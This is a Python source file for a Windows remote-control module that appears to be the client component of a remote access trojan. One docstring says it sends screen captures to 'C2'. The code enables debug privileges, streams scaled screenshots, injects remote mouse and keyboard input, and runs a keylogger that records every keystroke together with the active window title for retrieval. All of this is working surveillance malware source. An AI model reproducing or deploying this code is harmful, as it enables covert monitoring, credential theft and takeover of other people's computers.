import os
import time
import base64
import threading
import numpy as np
import traceback
import ctypes
import sys
from typing import Optional, Tuple, Dict, List
from PIL import Image
import mss
import mss.tools
from pynput import mouse, keyboard
import pyautogui
import win32gui
import win32con
import win32api
from io import BytesIO
from datetime import datetime

def is_admin():
    """Check if the script is running with admin privileges"""
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def enable_debug_privileges():
    """Try to enable debug privileges if possible"""
    try:
        import win32security
        import win32api
        import ntsecuritycon
        
        # Get the current process token
        hToken = win32security.OpenProcessToken(
            win32api.GetCurrentProcess(),
            win32security.TOKEN_ADJUST_PRIVILEGES | win32security.TOKEN_QUERY
        )
        
        # Enable debug privilege
        privilege_id = win32security.LookupPrivilegeValue(
            None, 
            ntsecuritycon.SE_DEBUG_NAME
        )
        
        win32security.AdjustTokenPrivileges(
            hToken, 
            0, 
            [(privilege_id, win32security.SE_PRIVILEGE_ENABLED)]
        )
        
        return True
    except Exception as e:
        print(f"Failed to enable debug privileges: {e}")
        return False

class RemoteControl:
    def __init__(self):
        self.screen_capture = None
        self.keyboard_listener = None
        self.mouse_listener = None
        self.is_capturing = False
        self.is_controlling = False
        self.quality = 50  # JPEG quality (1-100)
        self.scale_factor = 0.5  # Scale factor for screen capture
        
        # Keylogger related variables
        self.keylog_buffer = []
        self.keylog_active = False
        self.keylog_lock = threading.Lock()
        self.last_window_title = ""
        self.keylog_listener = None
        
        # Debug print
        print(f"[RemoteControl] Initializing with admin: {is_admin()}")
        if not is_admin():
            print("[RemoteControl] WARNING: Not running with admin privileges. Some features may not work.")
        
        # Try to enable debug privileges if possible
        enable_debug_privileges()
        
        # Initialize screen capture
        self._setup_screen_capture()
        
    def _setup_screen_capture(self):
        """Initialize screen capture"""
        try:
            self.screen_capture = mss.mss()
            print("[RemoteControl] Screen capture initialized successfully")
        except Exception as e:
            print(f"[RemoteControl] Error setting up screen capture: {str(e)}")
            traceback.print_exc()
            
    def start_screen_capture(self) -> bool:
        """Start screen capture thread"""
        if self.is_capturing:
            print("[RemoteControl] Screen capture already running")
            return False
            
        self.is_capturing = True
        threading.Thread(
            target=self._capture_screen,
            daemon=True
        ).start()
        print("[RemoteControl] Screen capture started")
        return True
        
    def stop_screen_capture(self) -> bool:
        """Stop screen capture"""
        self.is_capturing = False
        print("[RemoteControl] Screen capture stopped")
        return True
        
    def _capture_screen(self):
        """Capture screen and send to C2"""
        while self.is_capturing:
            try:
                # Capture primary monitor
                screenshot = self.screen_capture.grab(
                    self.screen_capture.monitors[1]
                )
                
                # Convert to PIL Image
                img = Image.frombytes(
                    'RGB',
                    screenshot.size,
                    screenshot.rgb
                )
                
                # Resize for performance
                width, height = img.size
                new_size = (
                    int(width * self.scale_factor),
                    int(height * self.scale_factor)
                )
                img = img.resize(new_size, Image.Resampling.LANCZOS)
                
                # Convert to JPEG
                buffer = BytesIO()
                img.save(
                    buffer,
                    format='JPEG',
                    quality=self.quality
                )
                
                # Convert to base64
                img_str = base64.b64encode(
                    buffer.getvalue()
                ).decode()
                
                # Send the screenshot data through our callback
                if hasattr(self, 'on_screen_capture') and callable(self.on_screen_capture):
                    self.on_screen_capture(img_str)
                
                # Sleep to control frame rate
                time.sleep(0.1)  # 10 FPS
                
            except Exception as e:
                print(f"Error capturing screen: {str(e)}")
                time.sleep(1)  # Wait before retrying
                
    def capture_screenshot(self) -> Optional[str]:
        """Capture a single screenshot and return base64 encoded data"""
        try:
            if not self.screen_capture:
                self._setup_screen_capture()
                
            # Capture primary monitor
            screenshot = self.screen_capture.grab(
                self.screen_capture.monitors[1]
            )
                
            # Convert to PIL Image
            img = Image.frombytes(
                'RGB',
                screenshot.size,
                screenshot.rgb
            )
                
            # Resize for performance
            width, height = img.size
            new_size = (
                int(width * self.scale_factor),
                int(height * self.scale_factor)
            )
            img = img.resize(new_size, Image.Resampling.LANCZOS)
                
            # Convert to JPEG
            buffer = BytesIO()
            img.save(
                buffer,
                format='JPEG',
                quality=self.quality
            )
                
            # Convert to base64
            img_str = base64.b64encode(
                buffer.getvalue()
            ).decode()
            
            # Also send through callback if configured
            if hasattr(self, 'on_screen_capture') and callable(self.on_screen_capture):
                self.on_screen_capture(img_str)
                
            return img_str
                
        except Exception as e:
            print(f"Error capturing screenshot: {str(e)}")
            return None
        
    def start_input_control(self) -> bool:
        """Start keyboard and mouse control"""
        if self.is_controlling:
            return False
            
        self.is_controlling = True
        
        # Start keyboard listener
        self.keyboard_listener = keyboard.Listener(
            on_press=self._on_keyboard_press,
            on_release=self._on_keyboard_release
        )
        self.keyboard_listener.start()
        
        # Start mouse listener
        self.mouse_listener = mouse.Listener(
            on_move=self._on_mouse_move,
            on_click=self._on_mouse_click,
            on_scroll=self._on_mouse_scroll
        )
        self.mouse_listener.start()
        
        return True
        
    def stop_input_control(self) -> bool:
        """Stop keyboard and mouse control"""
        if not self.is_controlling:
            return False
            
        self.is_controlling = False
        
        if self.keyboard_listener:
            self.keyboard_listener.stop()
        if self.mouse_listener:
            self.mouse_listener.stop()
            
        return True
        
    def _on_keyboard_press(self, key):
        """Handle keyboard press events"""
        if not self.is_controlling:
            return
            
        try:
            # Convert key to string representation
            if hasattr(key, 'char'):
                key_str = key.char
            else:
                key_str = str(key)
                
            # Send event to network module through callback
            if hasattr(self, 'on_input_event') and callable(self.on_input_event):
                self.on_input_event({
                    'type': 'key_press',
                    'key': key_str
                })
            
        except Exception as e:
            print(f"Error handling keyboard press: {str(e)}")
            
    def _on_keyboard_release(self, key):
        """Handle keyboard release events"""
        if not self.is_controlling:
            return
            
        try:
            # Convert key to string representation
            if hasattr(key, 'char'):
                key_str = key.char
            else:
                key_str = str(key)
                
            # Send event to network module through callback
            if hasattr(self, 'on_input_event') and callable(self.on_input_event):
                self.on_input_event({
                    'type': 'key_release',
                    'key': key_str
                })
            
        except Exception as e:
            print(f"Error handling keyboard release: {str(e)}")
            
    def _on_mouse_move(self, x, y):
        """Handle mouse move events"""
        if not self.is_controlling:
            return
            
        try:
            # Send event to network module through callback
            if hasattr(self, 'on_input_event') and callable(self.on_input_event):
                self.on_input_event({
                    'type': 'mouse_move',
                    'x': x,
                    'y': y
                })
            
        except Exception as e:
            print(f"Error handling mouse move: {str(e)}")
            
    def _on_mouse_click(self, x, y, button, pressed):
        """Handle mouse click events"""
        if not self.is_controlling:
            return
            
        try:
            # Convert button to string
            button_str = str(button).split('.')[-1]
            
            # Send event to network module through callback
            if hasattr(self, 'on_input_event') and callable(self.on_input_event):
                self.on_input_event({
                    'type': 'mouse_click',
                    'x': x,
                    'y': y,
                    'button': button_str,
                    'pressed': pressed
                })
            
        except Exception as e:
            print(f"Error handling mouse click: {str(e)}")
            
    def _on_mouse_scroll(self, x, y, dx, dy):
        """Handle mouse scroll events"""
        if not self.is_controlling:
            return
            
        try:
            # Send event to network module through callback
            if hasattr(self, 'on_input_event') and callable(self.on_input_event):
                self.on_input_event({
                    'type': 'mouse_scroll',
                    'x': x,
                    'y': y,
                    'dx': dx,
                    'dy': dy
                })
            
        except Exception as e:
            print(f"Error handling mouse scroll: {str(e)}")
            
    def execute_mouse_action(
        self,
        action: str,
        x: int,
        y: int,
        button: str = 'left'
    ) -> bool:
        """Execute mouse action on target"""
        try:
            # Apply inverse scaling if needed to convert from scaled coordinates back to screen coordinates
            if hasattr(self, 'scale_factor') and self.scale_factor != 1.0:
                x = int(x / self.scale_factor)
                y = int(y / self.scale_factor)
                
            if action == 'move':
                pyautogui.moveTo(x, y)
            elif action == 'click':
                pyautogui.click(x, y, button=button)
            elif action == 'doubleclick':
                pyautogui.doubleClick(x, y, button=button)
            elif action == 'rightclick':
                pyautogui.rightClick(x, y)
            elif action == 'down':
                pyautogui.mouseDown(x, y, button=button)
            elif action == 'up':
                pyautogui.mouseUp(x, y, button=button)
            return True
        except Exception as e:
            print(f"Error executing mouse action: {str(e)}")
            return False
            
    def execute_keyboard_action(
        self,
        action: str,
        key: str
    ) -> bool:
        """Execute keyboard action on target"""
        try:
            if action == 'press':
                pyautogui.press(key)
            elif action == 'down':
                pyautogui.keyDown(key)
            elif action == 'up':
                pyautogui.keyUp(key)
            elif action == 'hotkey':
                pyautogui.hotkey(*key.split('+'))
            return True
        except Exception as e:
            print(f"Error executing keyboard action: {str(e)}")
            return False
            
    def get_window_list(self) -> list:
        """Get list of all windows"""
        windows = []
        def callback(hwnd, windows):
            if win32gui.IsWindowVisible(hwnd):
                title = win32gui.GetWindowText(hwnd)
                if title:
                    windows.append({
                        'hwnd': hwnd,
                        'title': title,
                        'rect': win32gui.GetWindowRect(hwnd)
                    })
            return True
        win32gui.EnumWindows(callback, windows)
        return windows
        
    def focus_window(self, hwnd: int) -> bool:
        """Focus a window by handle"""
        try:
            if win32gui.IsIconic(hwnd):  # If minimized
                win32gui.ShowWindow(hwnd, win32con.SW_RESTORE)
            win32gui.SetForegroundWindow(hwnd)
            return True
        except Exception as e:
            print(f"Error focusing window: {str(e)}")
            return False
            
    def get_active_window(self) -> Optional[dict]:
        """Get the currently active window"""
        try:
            hwnd = win32gui.GetForegroundWindow()
            title = win32gui.GetWindowText(hwnd)
            rect = win32gui.GetWindowRect(hwnd)
            return {
                'hwnd': hwnd,
                'title': title,
                'rect': rect
            }
        except Exception as e:
            print(f"Error getting active window: {str(e)}")
            return None

    # Keylogger functionality
    def start_keylogger(self) -> bool:
        """Start the keylogger"""
        if self.keylog_active:
            print("[RemoteControl] Keylogger already active")
            return False
            
        try:
            self.keylog_active = True
            self.keylog_buffer = []
            
            print("[RemoteControl] Starting keylogger with listener...")
            
            # First try regular approach
            try:
                self.keylog_listener = keyboard.Listener(
                    on_press=self._on_keylog_press,
                    suppress=False  # Don't suppress keypresses
                )
                self.keylog_listener.start()
                print("[RemoteControl] Keylogger listener started successfully")
            except Exception as e:
                print(f"[RemoteControl] Standard keylogger failed: {e}")
                traceback.print_exc()
                
                # Fallback to alternative method if regular approach fails
                try:
                    print("[RemoteControl] Attempting alternate keyboard hook method...")
                    # Use a different approach as fallback
                    self.keylog_listener = keyboard.Listener(
                        on_press=self._on_keylog_press,
                        suppress=False,
                        win32_event_filter=None
                    )
                    self.keylog_listener.start()
                    print("[RemoteControl] Alternate keylogger method successful")
                except Exception as e2:
                    print(f"[RemoteControl] Alternate keylogger also failed: {e2}")
                    traceback.print_exc()
                    self.keylog_active = False
                    return False
            
            # Start thread to check active window periodically
            threading.Thread(
                target=self._monitor_active_window,
                daemon=True
            ).start()
            
            print("[RemoteControl] Keylogger initialized successfully")
            return True
        except Exception as e:
            print(f"[RemoteControl] Error starting keylogger: {str(e)}")
            traceback.print_exc()
            self.keylog_active = False
            return False
    
    def stop_keylogger(self) -> bool:
        """Stop the keylogger"""
        if not self.keylog_active:
            print("[RemoteControl] Keylogger already stopped")
            return False
            
        try:
            self.keylog_active = False
            
            if self.keylog_listener:
                try:
                    self.keylog_listener.stop()
                    print("[RemoteControl] Keylogger listener stopped successfully")
                except Exception as e:
                    print(f"[RemoteControl] Error stopping keylogger listener: {e}")
                
                self.keylog_listener = None
                
            print("[RemoteControl] Keylogger stopped")
            return True
        except Exception as e:
            print(f"[RemoteControl] Error stopping keylogger: {str(e)}")
            traceback.print_exc()
            return False
    
    def get_keylog_data(self) -> List[Dict]:
        """Get the current keylog buffer and clear it"""
        print(f"[RemoteControl] Getting keylog data, current buffer size: {len(self.keylog_buffer)}")
        with self.keylog_lock:
            data = self.keylog_buffer.copy()
            self.keylog_buffer = []
        return data
    
    def _on_keylog_press(self, key):
        """Handle keypress for keylogger"""
        if not self.keylog_active:
            return
            
        try:
            # Convert key to string representation
            if hasattr(key, 'char'):
                key_str = key.char
            else:
                key_str = str(key).replace("Key.", "")
            
            # Debug print
            print(f"[RemoteControl] Keypress detected: {key_str}")
                
            # Append to buffer with timestamp and active window
            with self.keylog_lock:
                self.keylog_buffer.append({
                    'timestamp': datetime.now().isoformat(),
                    'key': key_str,
                    'window': self.last_window_title
                })
        except Exception as e:
            print(f"[RemoteControl] Error logging key press: {str(e)}")
            traceback.print_exc()
    
    def _monitor_active_window(self):
        """Monitor and update the active window title for the keylogger"""
        print("[RemoteControl] Window monitor thread started")
        while self.keylog_active:
            try:
                active_window = self.get_active_window()
                if active_window:
                    new_title = active_window.get('title', '')
                    if new_title != self.last_window_title:
                        print(f"[RemoteControl] Active window changed: {new_title}")
                        self.last_window_title = new_title
            except Exception as e:
                print(f"[RemoteControl] Error monitoring active window: {e}")
            
            time.sleep(1)  # Check every second 